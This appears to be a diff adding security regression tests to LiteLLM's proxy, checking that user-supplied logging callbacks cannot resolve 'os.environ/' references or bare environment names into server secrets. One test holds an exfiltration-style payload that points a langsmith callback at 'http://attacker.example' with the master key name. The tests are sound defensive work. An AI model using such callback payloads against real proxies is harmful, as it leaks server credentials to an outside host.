@@ -8,9 +8,10 @@ from unittest.mock import AsyncMock, MagicMock, patch
 
 import pytest
 from fastapi import Request
+from pydantic import ValidationError as PydanticValidationError
 
 import litellm
-from litellm.proxy._types import TeamCallbackMetadata, UserAPIKeyAuth
+from litellm.proxy._types import AddTeamCallback, TeamCallbackMetadata, UserAPIKeyAuth
 from litellm.proxy.litellm_pre_call_utils import (
     KeyAndTeamLoggingSettings,
     LiteLLMProxyRequestSetup,
@@ -840,6 +841,81 @@ def test_get_dynamic_logging_metadata_with_arize_team_logging():
     assert result.callback_vars is not None
     assert result.callback_vars["arize_api_key"] == "test_arize_api_key"
     assert result.callback_vars["arize_space_id"] == "test_arize_space_id"
+
+
+
+def test_add_team_callback_rejects_env_reference():
+    with pytest.raises((PydanticValidationError, ValueError)) as exc_info:
+        AddTeamCallback(
+            callback_name="langfuse",
+            callback_type="success",
+            callback_vars={
+                "langfuse_secret_key": "os.environ/LANGFUSE_SECRET_KEY_TEMP"
+            },
+        )
+
+    assert "os.environ/" in str(exc_info.value)
+
+
+def test_get_dynamic_logging_metadata_ignores_env_reference_from_key_metadata(
+    monkeypatch,
+):
+    monkeypatch.setenv("LANGFUSE_SECRET_KEY_TEMP", "server-side-secret")
+    monkeypatch.setattr(
+        litellm.utils,
+        "get_secret",
+        lambda *args, **kwargs: pytest.fail("get_secret should not be called"),
+    )
+    user_api_key_dict = UserAPIKeyAuth(
+        api_key="test-key",
+        metadata={
+            "logging": [
+                {
+                    "callback_name": "langfuse",
+                    "callback_type": "success",
+                    "callback_vars": {
+                        "langfuse_secret_key": "os.environ/LANGFUSE_SECRET_KEY_TEMP",
+                    },
+                }
+            ]
+        },
+        team_metadata={},
+    )
+
+    result = _get_dynamic_logging_metadata(
+        user_api_key_dict=user_api_key_dict, proxy_config=MagicMock()
+    )
+
+    assert result is None
+
+
+def test_get_dynamic_logging_metadata_keeps_bare_env_name_unresolved(monkeypatch):
+    monkeypatch.setenv("LITELLM_MASTER_KEY", "sk-should-not-leak")
+    user_api_key_dict = UserAPIKeyAuth(
+        api_key="test-key",
+        metadata={
+            "logging": [
+                {
+                    "callback_name": "langsmith",
+                    "callback_type": "success_and_failure",
+                    "callback_vars": {
+                        "langsmith_api_key": "LITELLM_MASTER_KEY",
+                        "langsmith_project": "exfil",
+                        "langsmith_base_url": "http://attacker.example",
+                    },
+                }
+            ]
+        },
+        team_metadata={},
+    )
+
+    result = _get_dynamic_logging_metadata(
+        user_api_key_dict=user_api_key_dict, proxy_config=MagicMock()
+    )
+
+    assert result is not None
+    assert result.callback_vars["langsmith_api_key"] == "LITELLM_MASTER_KEY"
+    assert "sk-should-not-leak" not in result.callback_vars.values()
 
 
 def test_get_num_retries_from_request():
